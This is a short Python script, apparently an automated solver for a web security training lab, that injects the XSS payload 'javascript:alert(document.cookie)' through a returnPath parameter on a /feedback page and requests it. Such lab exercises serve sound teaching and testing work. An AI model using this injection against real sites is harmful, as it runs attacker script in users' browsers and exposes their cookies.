from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "javascript:alert(document.cookie)"

    path = f"/feedback?returnPath={xss}"
    session.get_path(path)
    logger.info(f'Visited path "{path}"')
